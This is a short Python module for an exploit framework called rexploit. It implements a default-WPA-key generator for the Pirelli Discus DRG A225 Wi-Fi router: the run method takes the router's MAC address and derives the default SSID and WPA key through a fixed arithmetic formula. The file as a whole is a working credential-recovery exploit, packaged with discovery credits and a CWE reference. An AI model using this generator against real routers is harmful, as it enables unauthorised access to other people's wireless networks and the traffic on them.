# coding=utf-8
from rexploit.interfaces.iexploit import IExploit


class Exploit(IExploit):
    def __init__(self):
        super(Exploit, self).__init__(
            name="DRG A225 WiFi router default WPA",
            category="generator",
            authors={
                "Vulnerability discovery": "Muris Kurgas",
                "Rexploit module": "Daniel Diez"
            },
            date="17/02/2014",
            cwe="310",
            targets=[
                "DRG A225"
            ],
            references={
                "http://www.remote-exploit.org/content/Pirelli_Discus_DRG_A225_WiFi_router.pdf": "Remote-IExploit"
            },
            description="Generates WPA key for Pirelli Discus DRG A225 (used e.g. by Croatian T-com)"
        )

    # This code is work of Ján Trenčanský
    def run(self, mac):
        mac = mac.upper()
        mac = mac.replace("-", "")
        mac = mac.replace(":", "")

        const = int('D0EC31', 16)
        inp = int(mac[6:], 16)
        result = (inp - const) // 4
        ssid = "Discus--" + mac[6:]
        key = "YW0" + str(result)
        return "{0} - {1}".format(key, ssid)
